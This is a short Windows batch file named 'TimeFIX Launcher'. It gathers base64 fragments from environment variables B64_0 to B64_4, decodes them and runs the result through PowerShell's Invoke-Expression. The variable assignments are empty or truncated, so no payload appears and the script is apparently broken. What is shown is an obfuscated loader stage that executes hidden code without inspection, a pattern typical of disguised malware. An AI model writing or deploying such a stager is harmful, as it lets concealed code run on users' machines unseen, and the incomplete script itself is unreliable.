@echo off
REM TimeFIX Launcher (env-var passthrough)
setlocal enabledelayedexpansion
set B64_
set B64_
set B64_
set B64_
set B64_

powershell -NoLogo -ExecutionPolicy RemoteSigned -Command "$b='' + [Environment]::GetEnvironmentVariable('B64_0','Process') + [Environment]::GetEnvironmentVariable('B64_1','Process') + [Environment]::GetEnvironmentVariable('B64_2','Process') + [Environment]::GetEnvironmentVariable('B64_3','Process') + [Environment]::GetEnvironmentVariable('B64_4','Process');If($b){$d=[Convert]::FromBase64String($b);$s=[Text.Encoding]::UTF8.GetString($d);iex($s)}"
endlocal
